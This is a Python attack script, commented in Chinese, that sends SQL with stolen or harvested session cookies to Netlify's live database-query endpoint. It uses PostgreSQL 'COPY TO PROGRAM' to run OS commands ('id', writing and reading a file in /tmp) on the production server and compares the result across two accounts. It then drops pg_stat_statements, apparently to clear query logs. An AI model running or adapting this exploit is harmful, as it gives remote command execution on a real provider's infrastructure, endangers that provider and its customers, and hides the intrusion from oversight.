# -*- coding: utf-8 -*-
"""决定性测试:netlifydb_owner 直接(无提权)执行 COPY TO PROGRAM?
若 permission denied = 刚才成功来自链上下文
若 program failed = owner 级 OS 命令执行(独立大洞)
+ 清理 pg_stat_statements"""
import http.client, ssl, gzip, brotli, json, sys
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_A, SITE_A, COOKIE_B

SITE_B = 'd2977de0-d24d-4544-81cb-933e610cad7d'
ctx = ssl.create_default_context()
P = '/.netlify/functions/database-query'


def q(sql, cookie=COOKIE_A, site=SITE_A, timeout=40):
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 Chrome/126.0', 'Accept-Encoding': 'br, gzip',
         'Accept': 'application/json', 'Content-Type': 'application/json', 'Cookie': cookie}
    body = {'siteId': site, 'action': 'query', 'sql': sql}
    conn.request('POST', P, body=json.dumps(body).encode(), headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    out = raw[:600].decode('utf-8', 'ignore')
    conn.close()
    return st, out


print('== A: owner 直接 COPY PROGRAM ==')
st, out = q("copy (select 'x') to program 'false'")
print('A copy false 直接 [%d] %s' % (st, out[:300]))
st, out = q("copy (select 'x') to program 'echo hi > /tmp/k_test9 && cat /tmp/k_test9'")
print('A copy 写文件+读  [%d] %s' % (st, out[:300]))
st, out = q("copy (select 'x') to program 'id'")
print('A copy id         [%d] %s' % (st, out[:300]))

print()
print('== B: 对照 ==')
st, out = q("copy (select 'x') to program 'false'", cookie=COOKIE_B, site=SITE_B)
print('B copy false 直接 [%d] %s' % (st, out[:300]))

print()
print('== 收尾清理 ==')
st, out = q('drop extension if exists pg_stat_statements cascade')
print('A drop pss [%d] %s' % (st, out[:200]))
st, out = q("select extname from pg_extension order by 1")
print('A exts [%d] %s' % (st, out[:300]))
